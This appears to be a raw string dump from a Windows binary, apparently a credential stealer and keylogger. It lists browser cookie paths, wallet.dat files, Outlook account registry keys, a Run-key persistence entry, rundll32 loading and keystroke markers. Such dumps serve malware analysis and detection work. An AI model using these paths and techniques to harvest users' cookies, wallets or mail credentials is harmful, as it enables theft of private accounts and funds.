6aaa8,".txt"
6aab2,".docx"
6aabe,".xls"
6aad0,"wallet.dat"
689de,".tmp"
6a640,"Started \""
68944,"\"."
6a620,"firefox.exe"
6a620,"firefox.exe"
6a6e0,"Finish \""
68944,"\"."
6a6cc,"Firefox"
68590,"\Mozilla\Firefox\Profiles"
681fa,"\*"
6a5b0,"cookies.sqlite"
6a5d0,"Firefox cookies was not found, \""
68944,"\"."
690b0,"Software\Microsoft\Windows\CurrentVersion\Run"
68950,"chrome.exe"
6a640,"Started \""
68944,"\"."
68950,"chrome.exe"
6a6e0,"Finish \""
68944,"\"."
689d0,"Chrome"
68c42,".dll"
68c50,"\"%s\",DllRegisterServer"
68c80,"rundll32.exe"
6aa90,"*wallet.dat"
688a0,"\Google\Chrome\User Data"
681fa,"\*"
6a6f2,"Cookies"
6a710,"Chrome cookies was not found, \""
68944,"\"."
68602,"\"
696ca,"\n"
69aa0,"C:\Windows\SystemApps\*"
69ad0,"Microsoft.MicrosoftEdge"
689de,".tmp"
68eb0,"[VK_BACK]"
689de,".tmp"
6a4ba,"*.txt"
6a4d0,"*.cookie"
6a4f0,"iexplore.exe"
6a50a,"Low"
6a520,"Internet Explorer"
68200,"tmp"
68210,"%s%08x.%s"
68ed0,"Software\Microsoft\"
68c9a,".exe"
68cb0,"rundll32.exe \"%s\",DllRegisterServer"
69110,"rundll32.exe %s,DllRegisterServer"
690b0,"Software\Microsoft\Windows\CurrentVersion\Run"
690b0,"Software\Microsoft\Windows\CurrentVersion\Run"
68c9a,".exe"
68c42,".dll"
68c9a,".exe"
692ce," >> "
68602,"\"
68602,"\"
68450,"%s\mozilla\firefox\profiles\*"
68490,"%s\mozilla\firefox\profiles\%s\cache2\entries"
696e0,"Software\Microsoft\Internet Account Manager\Accounts"
69750,"Identities"
696e0,"Software\Microsoft\Internet Account Manager\Accounts"
69766,"Outlook"
69780,"Software\Microsoft\Internet Account Manager"
697e0,"\Accounts"
69800,"Software\Microsoft\Office\Outlook\OMI Account Manager\Accounts"
69880,"Software\Microsoft\Windows NT\CurrentVersion\Windows Messaging Subsystem\Profiles\Microsoft Outlook Internet Settings"
69970,"Software\Microsoft\Windows NT\CurrentVersion\Windows Messaging Subsystem\Profiles\Outlook"
69a30,"Software\Microsoft\Office\15.0\Outlook\Profiles\Outlook"
69766,"Outlook"
68520,"ntdll.dll"
6a8c0,"user32.dll"
696c4,": "
696ca,"\n"
696c4,": "
696ca,"\n"
696c4,": "
696ca,"\n"
